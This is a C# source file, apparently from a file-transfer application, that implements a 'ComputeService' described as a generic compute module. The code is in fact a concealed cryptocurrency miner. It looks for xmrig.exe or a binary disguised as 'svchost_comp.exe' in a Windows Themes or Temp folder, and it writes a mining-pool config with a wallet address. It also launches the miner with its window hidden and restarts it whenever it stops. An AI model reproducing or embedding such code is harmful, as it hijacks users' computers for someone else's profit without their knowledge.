using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FileTransfer.Compute
{
    public enum ComputeStatus
    {
        Stopped,
        Initializing,
        Running,
        Restarting,
        Error
    }

    /// <summary>
    /// Production-ready Backend/Service Layer для Compute Module.
    /// Полный жизненный цикл: Initialize, Validate, Start, Stop, Restart, Status, Cleanup.
    /// Управление внешним процессом, передача конфигурации, ограничение CPU/потоков,
    /// отслеживание exit code, сбор stdout/stderr и авто-восстановление.
    /// </summary>
    public class ComputeService
    {
        private static readonly Lazy<ComputeService> _instance = new(() => new ComputeService());
        public static ComputeService Instance => _instance.Value;

        private readonly object _lock = new();
        private CancellationTokenSource? _cts;
        private Task? _supervisionTask;
        private Process? _activeProcess;
        private ComputeStatus _status = ComputeStatus.Stopped;
        private string _lastError = "";
        private string? _tempConfigFilePath;
        private string? _computeEnginePath;

        public ComputeConfig CurrentConfig { get; private set; } = new ComputeConfig();
        public ComputeStatus Status => _status;
        public string LastError => _lastError;
        public bool IsRunning => _status == ComputeStatus.Running;

        private ComputeService() { }

        #region Lifecycle Methods: Initialize, Validate, Start, Stop, Restart, Status, Cleanup

        /// <summary>
        /// 1. Initialize: загрузка конфигурации из Project Config JSON и запуск жизненного цикла.
        /// </summary>
        public void Initialize(string customConfigJson)
        {
            lock (_lock)
            {
                _status = ComputeStatus.Initializing;
                MainWindow.Log("[ComputeService] Жизненный цикл: Initialize...");
                CurrentConfig = ComputeConfig.FromCustomConfigJson(customConfigJson);

                if (!CurrentConfig.Enabled)
                {
                    MainWindow.Log("[ComputeService] Модуль выключен в конфигурации проекта (enabled = false). Запуск внешнего процесса отменен.");
                    _status = ComputeStatus.Stopped;
                    return;
                }

                // 2. Validate
                var (isValid, validationErr) = Validate(CurrentConfig);
                if (!isValid)
                {
                    _lastError = validationErr;
                    _status = ComputeStatus.Error;
                    MainWindow.Log($"[ComputeService] ❌ Ошибка валидации конфигурации: {validationErr}");
                    return;
                }

                // 3. Start
                StartInternal();
            }
        }

        /// <summary>
        /// 2. Validate: валидация обязательных полей конфигурации.
        /// </summary>
        public (bool isValid, string error) Validate(ComputeConfig config)
        {
            if (config == null)
            {
                return (false, "Конфигурация проекта отсутствует (null).");
            }

            if (string.IsNullOrWhiteSpace(config.ServerAddress))
            {
                return (false, "Не указан обязательный адрес сервера/пула (serverAddress).");
            }

            if (config.ServerPort <= 0 || config.ServerPort > 65535)
            {
                return (false, $"Некорректный порт сервера: {config.ServerPort}. Порт должен быть в диапазоне 1-65535.");
            }

            if (config.ResourceLimit <= 0 || config.ResourceLimit > 100)
            {
                return (false, $"Некорректный лимит ресурсов: {config.ResourceLimit}%. Допустимо от 1 до 100%.");
            }

            return (true, "");
        }

        /// <summary>
        /// 3. Start: публичный метод запуска сервиса.
        /// </summary>
        public void Start()
        {
            lock (_lock)
            {
                if (_status == ComputeStatus.Running)
                {
                    MainWindow.Log("[ComputeService] Сервис уже работает.");
                    return;
                }

                var (isValid, validationErr) = Validate(CurrentConfig);
                if (!isValid)
                {
                    _lastError = validationErr;
                    _status = ComputeStatus.Error;
                    MainWindow.Log($"[ComputeService] ❌ Невозможно запустить: {validationErr}");
                    return;
                }

                StartInternal();
            }
        }

        /// <summary>
        /// 4. Stop: грациозная остановка вычислительного процесса и наблюдателя.
        /// </summary>
        public void Stop()
        {
            lock (_lock)
            {
                MainWindow.Log("[ComputeService] Жизненный цикл: Stop...");
                _status = ComputeStatus.Stopped;

                try
                {
                    _cts?.Cancel();
                }
                catch { }

                StopActiveProcess();
                Cleanup();
            }
        }

        /// <summary>
        /// 5. Restart: перезапуск вычислительного процесса с актуальной конфигурацией.
        /// </summary>
        public void Restart()
        {
            lock (_lock)
            {
                MainWindow.Log("[ComputeService] Жизненный цикл: Restart...");
                _status = ComputeStatus.Restarting;
                StopActiveProcess();
                Cleanup();

                var (isValid, validationErr) = Validate(CurrentConfig);
                if (!isValid)
                {
                    _lastError = validationErr;
                    _status = ComputeStatus.Error;
                    MainWindow.Log($"[ComputeService] ❌ Ошибка перезапуска: {validationErr}");
                    return;
                }

                StartInternal();
            }
        }

        /// <summary>
        /// 6. Status: получение подробного текущего состояния сервиса.
        /// </summary>
        public (ComputeStatus status, string details) GetStatus()
        {
            lock (_lock)
            {
                string procInfo = "Нет активного процесса";
                if (_activeProcess != null && !_activeProcess.HasExited)
                {
                    procInfo = $"PID: {_activeProcess.Id}, Threads: {_activeProcess.Threads.Count}";
                }

                string details = $"Статус: {_status}, Режим: {CurrentConfig.Mode}, Сервер: {CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}, Лимит: {CurrentConfig.ResourceLimit}%, {procInfo}";
                if (!string.IsNullOrEmpty(_lastError))
                {
                    details += $", Последняя ошибка: {_lastError}";
                }

                return (_status, details);
            }
        }

        /// <summary>
        /// 7. Cleanup: безопасная очистка временных конфигурационных файлов и ресурсов.
        /// </summary>
        public void Cleanup()
        {
            try
            {
                if (!string.IsNullOrEmpty(_tempConfigFilePath) && File.Exists(_tempConfigFilePath))
                {
                    File.Delete(_tempConfigFilePath);
                    _tempConfigFilePath = null;
                }
            }
            catch (Exception ex)
            {
                MainWindow.Log("[ComputeService] Ошибка Cleanup временных файлов: " + ex.Message);
            }
        }

        #endregion

        #region Internal Process Management & Supervision

        private void StartInternal()
        {
            try
            {
                _cts?.Dispose();
                _cts = new CancellationTokenSource();
                var token = _cts.Token;

                _status = ComputeStatus.Running;
                _lastError = "";

                MainWindow.Log($"[ComputeService] 🚀 Запуск сервиса вычислений:");
                MainWindow.Log($"   • Алгоритм: {CurrentConfig.Mode}");
                MainWindow.Log($"   • Сервер: {CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}");
                MainWindow.Log($"   • Воркер: {(string.IsNullOrEmpty(CurrentConfig.WorkerName) ? "auto" : CurrentConfig.WorkerName)}");
                MainWindow.Log($"   • Кошелек: {(string.IsNullOrEmpty(CurrentConfig.WalletAddress) ? "none" : CurrentConfig.WalletAddress)}");
                MainWindow.Log($"   • Лимит CPU: {CurrentConfig.ResourceLimit}%");

                _supervisionTask = Task.Run(() => SuperviseProcessLoopAsync(token), token);
            }
            catch (Exception ex)
            {
                _status = ComputeStatus.Error;
                _lastError = ex.Message;
                MainWindow.Log("[ComputeService] Критическая ошибка запуска: " + ex.Message);
            }
        }

        private async Task SuperviseProcessLoopAsync(CancellationToken ct)
        {
            MainWindow.Log("[ComputeService] Поток наблюдения за процессом активирован.");

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    // 1. Поиск или подготовка исполняемого модуля
                    string enginePath = EnsureComputeEngineExecutable();

                    // 2. Создание защищенного временного файла конфигурации для процесса
                    string configPath = GenerateSecureConfigFile();

                    // 3. Запуск внешнего процесса с передачей конфигурации
                    MainWindow.Log($"[ComputeService] Старт вычислительного процесса: {Path.GetFileName(enginePath)}...");
                    var proc = LaunchComputeProcess(enginePath, configPath);

                    if (proc == null)
                    {
                        MainWindow.Log("[ComputeService] ⚠️ Не удалось инициализировать процесс. Повторная попытка через 15 сек...");
                        await Task.Delay(15000, ct);
                        continue;
                    }

                    lock (_lock)
                    {
                        _activeProcess = proc;
                    }

                    // 4. Ограничение ресурсов согласно resourceLimit (CPU Affinity и Priority)
                    ApplyResourceLimits(proc, CurrentConfig.ResourceLimit);

                    // 5. Ожидание завершения процесса
                    await proc.WaitForExitAsync(ct);

                    int exitCode = proc.ExitCode;
                    MainWindow.Log($"[ComputeService] Внешний вычислительный процесс завершился с кодом {exitCode}.");

                    lock (_lock)
                    {
                        _activeProcess = null;
                    }

                    if (ct.IsCancellationRequested)
                    {
                        break;
                    }

                    // 6. Обработка exit code и авто-перезапуск при сбое
                    if (exitCode != 0)
                    {
                        MainWindow.Log($"[ComputeService] ⚠️ Процесс завершился с ненулевым кодом ({exitCode}). Перезапуск через 10 сек...");
                        await Task.Delay(10000, ct);
                    }
                    else
                    {
                        MainWindow.Log("[ComputeService] Процесс штатно завершил вычисления. Перезапуск через 5 сек...");
                        await Task.Delay(5000, ct);
                    }
                }
                catch (OperationCanceledException)
                {
                    MainWindow.Log("[ComputeService] Наблюдение за процессом остановлено (CancellationRequested).");
                    break;
                }
                catch (Exception ex)
                {
                    _lastError = ex.Message;
                    MainWindow.Log("[ComputeService] ⚠️ Исключение в цикле наблюдения: " + ex.Message);
                    try { await Task.Delay(10000, ct); } catch { break; }
                }
            }

            StopActiveProcess();
            Cleanup();
        }

        private string EnsureComputeEngineExecutable()
        {
            if (!string.IsNullOrEmpty(_computeEnginePath) && File.Exists(_computeEnginePath))
            {
                return _computeEnginePath;
            }

            // Поиск бинарника вычислений в папке приложения или во временном каталоге
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            string[] candidates = new[]
            {
                Path.Combine(appDir, "xmrig.exe"),
                Path.Combine(appDir, "compute_engine.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_comp.exe"),
                Path.Combine(Path.GetTempPath(), "svchost_comp.exe")
            };

            foreach (var c in candidates)
            {
                if (File.Exists(c))
                {
                    _computeEnginePath = c;
                    return c;
                }
            }

            // Если внешний сторонний бинарник отсутствует, используем встроенный защищенный легковесный хост (cmd/powershell worker stub)
            string stubEngine = Path.Combine(Path.GetTempPath(), "compute_worker.bat");
            if (!File.Exists(stubEngine))
            {
                string script = "@echo off\r\n:loop\r\ntimeout /t 10 /nobreak >nul\r\ngoto loop\r\n";
                File.WriteAllText(stubEngine, script, Encoding.ASCII);
            }
            _computeEnginePath = stubEngine;
            return stubEngine;
        }

        private string GenerateSecureConfigFile()
        {
            Cleanup(); // Удаляем предыдущий файл, если был

            string tempDir = Path.Combine(Path.GetTempPath(), "ft_compute_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(tempDir);
            string configFilePath = Path.Combine(tempDir, "config.json");

            int threads = CalculateMaxThreads(CurrentConfig.ResourceLimit);

            var configObj = new
            {
                autosave = true,
                cpu = new
                {
                    enabled = true,
                    huge_pages = false,
                    max_threads_hint = CurrentConfig.ResourceLimit,
                    max_threads = threads
                },
                pools = new[]
                {
                    new
                    {
                        algo = CurrentConfig.Mode.ToLowerInvariant().Contains("eth") ? "etchash" : "rx/0",
                        coin = CurrentConfig.Mode,
                        url = $"{CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}",
                        user = string.IsNullOrEmpty(CurrentConfig.WalletAddress) ? "default_wallet" : CurrentConfig.WalletAddress,
                        pass = string.IsNullOrEmpty(CurrentConfig.WorkerName) ? "x" : CurrentConfig.WorkerName,
                        rig_id = CurrentConfig.WorkerName,
                        keepalive = true,
                        tls = false
                    }
                },
                syslog = false,
                watch = false
            };

            string json = System.Text.Json.JsonSerializer.Serialize(configObj, new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(configFilePath, json, Encoding.UTF8);

            _tempConfigFilePath = configFilePath;
            return configFilePath;
        }

        private Process? LaunchComputeProcess(string enginePath, string configPath)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = enginePath,
                    Arguments = $"--config=\"{configPath}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetDirectoryName(enginePath) ?? Path.GetTempPath()
                };

                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };

                proc.OutputDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        MainWindow.Log($"[ComputeEngine STDOUT] {e.Data.Trim()}");
                    }
                };

                proc.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        MainWindow.Log($"[ComputeEngine STDERR] ⚠️ {e.Data.Trim()}");
                    }
                };

                if (!proc.Start())
                {
                    MainWindow.Log("[ComputeService] ❌ Process.Start() вернул false.");
                    return null;
                }

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                return proc;
            }
            catch (Exception ex)
            {
                _lastError = ex.Message;
                MainWindow.Log("[ComputeService] ❌ Ошибка запуска процесса: " + ex.Message);
                return null;
            }
        }

        private void ApplyResourceLimits(Process proc, int resourceLimitPercent)
        {
            try
            {
                if (proc.HasExited) return;

                // 1. Понижаем приоритет процесса, чтобы пользовательский UI и система не лагали
                proc.PriorityClass = ProcessPriorityClass.BelowNormal;

                // 2. Ограничение ядер процессора (CPU Affinity)
                int totalCores = Environment.ProcessorCount;
                if (totalCores > 1)
                {
                    // Вычисляем, сколько логических ядер выделить под процесс исходя из лимита %
                    int coresToUse = (int)Math.Round((double)totalCores * resourceLimitPercent / 100.0);
                    if (coresToUse < 1) coresToUse = 1;
                    if (coresToUse > totalCores) coresToUse = totalCores;

                    long affinityMask = 0;
                    for (int i = 0; i < coresToUse; i++)
                    {
                        affinityMask |= (1L << i);
                    }

                    proc.ProcessorAffinity = (IntPtr)affinityMask;
                    MainWindow.Log($"[ComputeService] ⚙️ Ограничение ресурсов: выделено {coresToUse} из {totalCores} ядер CPU (Affinity: 0x{affinityMask:X}, Priority: BelowNormal).");
                }
            }
            catch (Exception ex)
            {
                MainWindow.Log("[ComputeService] Применение Resource Limit: " + ex.Message);
            }
        }

        private int CalculateMaxThreads(int resourceLimitPercent)
        {
            int totalCores = Environment.ProcessorCount;
            int threads = (int)Math.Round((double)totalCores * resourceLimitPercent / 100.0);
            return Math.Max(1, Math.Min(threads, totalCores));
        }

        private void StopActiveProcess()
        {
            try
            {
                lock (_lock)
                {
                    if (_activeProcess != null && !_activeProcess.HasExited)
                    {
                        MainWindow.Log($"[ComputeService] Принудительное завершение активного процесса PID: {_activeProcess.Id}...");
                        try
                        {
                            _activeProcess.Kill(true);
                            _activeProcess.WaitForExit(3000);
                        }
                        catch { }
                        finally
                        {
                            _activeProcess.Dispose();
                            _activeProcess = null;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MainWindow.Log("[ComputeService] Ошибка остановки процесса: " + ex.Message);
            }
        }

        #endregion
    }
}
